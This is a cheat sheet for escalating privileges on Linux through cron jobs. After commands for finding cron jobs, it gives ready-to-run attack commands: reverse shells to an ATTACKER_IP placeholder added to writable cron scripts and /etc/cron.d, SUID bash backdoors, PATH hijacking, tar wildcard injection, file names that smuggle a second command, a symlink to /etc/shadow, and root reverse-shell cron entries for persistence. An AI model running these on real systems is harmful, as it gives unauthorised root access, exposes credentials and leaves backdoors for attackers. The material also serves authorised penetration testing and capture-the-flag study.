# Cron Jobs Privilege Escalation Checklist

## Finding Cron Jobs

### System-Wide Cron

```bash
# Main crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# View contents
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
```

### User Crontabs

```bash
# Current user
crontab -l

# Other users (need read permission)
cat /var/spool/cron/crontabs/*
cat /var/spool/cron/*

# Root crontab (unlikely readable)
cat /var/spool/cron/crontabs/root
```

### Systemd Timers

```bash
# List all timers
systemctl list-timers --all

# Check timer configs
ls -la /etc/systemd/system/*.timer
ls -la /lib/systemd/system/*.timer
```

### Cron Logs

```bash
# Check syslog for CRON
grep "CRON" /var/log/syslog
grep "CRON" /var/log/cron.log
grep "cron" /var/log/messages

# Watch for cron execution
tail -f /var/log/syslog | grep CRON
```

---

## Using pspy to Find Hidden Crons

```bash
# pspy monitors processes without root
./pspy64
./pspy32

# With timestamps
./pspy64 -t

# Watch for processes that appear periodically
# Cron jobs will show up when they execute
```

---

## Exploitation Techniques

### 1. Writable Cron Script

If a cron job runs a script you can write to:

```bash
# Check permissions
ls -la /path/to/cron/script.sh

# If writable, add reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/script.sh

# Or add SUID backdoor
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh
# Wait for cron to execute, then:
/tmp/bash -p
```

### 2. Writable Cron Directory

If you can write to a cron directory:

```bash
# Check if writable
ls -la /etc/cron.d/

# Create malicious cron job
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' > /etc/cron.d/backdoor

# Or
echo '* * * * * root cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /etc/cron.d/backdoor
```

### 3. PATH Exploitation

If cron uses relative path to call a binary:

```bash
# Example crontab entry:
# * * * * * root backup.sh

# If PATH in crontab is /home/user:/usr/bin:/bin
# Create malicious script in first PATH location

echo '#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash' > /home/user/backup.sh

chmod +x /home/user/backup.sh

# Wait for cron, then:
/tmp/bash -p
```

### 4. Wildcard Injection

If cron script uses wildcards:

```bash
# Example vulnerable script:
# tar czf /tmp/backup.tar.gz *

# Exploit tar wildcard
cd /path/where/tar/runs
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh

# When tar runs with *, it processes these as arguments
# Wait for cron, then:
/tmp/bash -p
```

Common wildcards to exploit:

```bash
# tar
--checkpoint=1
--checkpoint-action=exec=COMMAND

# chown/chmod
--reference=MYFILE

# rsync
-e sh shell.sh
```

### 5. Symlink Attack

If cron script processes files you can symlink:

```bash
# If script does something like: cat /tmp/logs/* > /var/log/combined
# Create symlink to sensitive file
ln -s /etc/shadow /tmp/logs/shadow

# Script might expose contents
```

### 6. Environment Variables

Some crons inherit environment:

```bash
# Check if cron script uses variables
cat /path/to/script.sh | grep '\$'

# If uses something like $HOME
# Try to control environment
```

---

## Common Vulnerable Patterns

### Pattern 1: Script with Relative Commands

```bash
# Vulnerable:
#!/bin/bash
cd /opt/backup
tar -czf backup.tar.gz .

# Exploit: If /opt/backup is writable, use wildcard injection
```

### Pattern 2: Script Sources File

```bash
# Vulnerable:
#!/bin/bash
source /opt/config.sh
# Do something

# Exploit: If /opt/config.sh is writable
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /opt/config.sh
```

### Pattern 3: Script Uses User Input

```bash
# Vulnerable:
#!/bin/bash
for file in /home/*/backup; do
    cp $file /backup/
done

# Exploit: If you can control filename
touch '/home/user/backup; cp /bin/bash /tmp/bash; chmod +s /tmp/bash'
```

---

## Creating Persistent Access

Once you have root via cron:

```bash
# Add your own cron job
echo '* * * * * root bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' >> /etc/crontab

# Or in cron.d
echo '* * * * * root /tmp/shell.sh' > /etc/cron.d/persist
```

---

## Detection Timeline

| Cron Type | Check Frequency |
|-----------|-----------------|
| cron.d | Check /etc/cron.d/* |
| cron.hourly | Every hour |
| cron.daily | Usually 6:25 AM |
| cron.weekly | Usually Sunday 6:47 AM |
| cron.monthly | 1st of month 6:52 AM |
| Custom crontab | Based on schedule |

---

## Quick Reference: Crontab Format

```
* * * * * command
│ │ │ │ │
│ │ │ │ └─ Day of week (0-7, Sunday=0 or 7)
│ │ │ └─── Month (1-12)
│ │ └───── Day of month (1-31)
│ └─────── Hour (0-23)
└───────── Minute (0-59)

Examples:
* * * * *     Every minute
*/5 * * * *   Every 5 minutes
0 * * * *     Every hour
0 0 * * *     Every day at midnight
0 0 * * 0     Every Sunday at midnight
```



